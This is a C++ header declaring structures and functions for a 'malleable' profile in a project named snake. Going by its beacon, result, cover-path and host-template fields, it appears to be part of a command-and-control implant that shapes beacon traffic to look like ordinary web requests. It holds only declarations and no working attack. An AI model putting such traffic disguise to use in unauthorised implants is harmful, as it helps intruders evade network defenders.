#pragma once

#include <cstddef>
#include <string>
#include <vector>

namespace snake::malleable {

struct Header {
    std::string name;
    std::string value;
};

struct Profile {
    bool enabled = false;
    std::string user_agent;
    std::vector<Header> headers;
    std::string ws_path;
    std::string beacon_path;
    std::string result_path;
    std::vector<std::string> cover_paths;
    int cover_count = 0;
};

struct Endpoints {
    std::string ws;
    std::string beacon;
    std::string result;
};

struct TemplateVars {
    std::string id;
    std::string hostname;
    std::string os;
    std::string arch;
    std::string random_hex;
};

const std::string& default_user_agent();
Endpoints default_endpoints();

std::string effective_user_agent(const Profile& p);
std::vector<Header> effective_headers(const Profile& p);
Endpoints effective_endpoints(const Profile& p);
int effective_cover_count(const Profile& p);
std::string effective_cover_path(const Profile& p, std::size_t index);

bool expand_path(const std::string& tmpl, const TemplateVars& vars, std::string& out,
                 std::string& err);

bool profile_parse(const std::string& text, Profile& out, std::string& err);

bool profile_load(const std::string& path, Profile& out, std::string& err);

std::string profile_summary(const Profile& p);

}  // namespace snake::malleable
